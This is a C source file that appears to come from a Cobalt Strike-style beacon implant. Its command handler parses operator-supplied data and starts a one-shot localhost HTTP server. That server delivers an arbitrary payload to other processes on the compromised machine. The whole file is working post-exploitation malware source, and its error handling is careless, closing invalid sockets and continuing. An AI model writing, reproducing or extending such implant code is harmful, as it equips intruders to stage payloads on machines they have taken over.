#include "pch.h"

#include "web_response.h"

#include "beacon.h"
#include "network.h"
#include "thread.h"

typedef struct WEB_RESPONSE
{
	SOCKET socket;
	int contentLength;
	int headerLength;
	char* content;
	char* header;
	char* data;
} WEB_RESPONSE, *PWEB_RESPONSE;

WEB_RESPONSE* WebResponseInit(SOCKET socket, char* content, int contentLength)
{
#define MAX_HEADER_SIZE 0x100
#define MAX_DATA_SIZE 0x800
	WEB_RESPONSE* webResponse = malloc(sizeof(WEB_RESPONSE));
	webResponse->socket = socket;

	webResponse->content = malloc(contentLength);
	webResponse->contentLength = contentLength;
	memcpy(webResponse->content, content, contentLength);

	webResponse->header = malloc(MAX_HEADER_SIZE);
	snprintf(webResponse->header,
		MAX_HEADER_SIZE,
		"HTTP/1.1 200 OK\r\n"
		       "Content-Type: application/octet-stream\r\n"
		       "Content-Length: %d\r\n\r\n",
		contentLength);
	webResponse->headerLength = strlen(webResponse->header);

	webResponse->data = malloc(MAX_DATA_SIZE);
	return webResponse;
}

void WebResponseDestroy(WEB_RESPONSE* webResponse)
{
	closesocket(webResponse->socket);
	free(webResponse->content);
	free(webResponse->header);
	free(webResponse->data);
	free(webResponse);
}

int WebResponseReceiveUntilNewline(SOCKET socket, char* data, int size)
{
	int i = 0;
	while (i < size)
	{
		int read = recv(socket, data + i, sizeof(char), 0);
		if (read <= 0)
			break;

		i += read;

		int x = i - STRLEN("\r\n"); // the newline is \r\n
		if(x >= 0 && data[x] == '\r' && data[x + 1] == '\n')
		{
			data[x] = '\0';
			return i;
		}
	}
	return -1;
}

void WebResponseThread(WEB_RESPONSE* webResponse)
{
	SOCKET acceptSocket = accept(webResponse->socket, NULL, NULL);
	if (acceptSocket == INVALID_SOCKET) {
		WebResponseDestroy(webResponse);
	} else
	{
		while (WebResponseReceiveUntilNewline(acceptSocket, webResponse->data, MAX_DATA_SIZE) > STRLEN("\r\n"));

		send(acceptSocket, webResponse->header, webResponse->headerLength, 0);
		send(acceptSocket, webResponse->content, webResponse->contentLength, 0);

		WebResponseDestroy(webResponse);
		closesocket(acceptSocket);
	}

	--gThreadsActive;
}

void WebServerInit(short port, char* content, int contentLength)
{
	NetworkInit();
	SOCKET socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	SOCKET acceptSocket = INVALID_SOCKET;
	if (socket == INVALID_SOCKET)
		closesocket(acceptSocket);

	struct sockaddr_in service;
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = LOCALHOST;
	service.sin_port = htons(port);

	int bindResult = bind(socket, (SOCKADDR*)&service, sizeof(service));
	acceptSocket = socket;
	if (bindResult == SOCKET_ERROR)
		closesocket(acceptSocket);

	int listenResult = listen(socket, 120);
	acceptSocket = socket;
	if (listenResult == SOCKET_ERROR)
		closesocket(acceptSocket);

	WEB_RESPONSE* webResponse = WebResponseInit(acceptSocket, content, contentLength);
	CreateThreadEx(WebResponseThread, webResponse);
}

void WebServerLocal(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	char* content = BeaconDataBuffer(&parser);
	int contentLength = BeaconDataLength(&parser);
	WebServerInit(port, content, contentLength);
}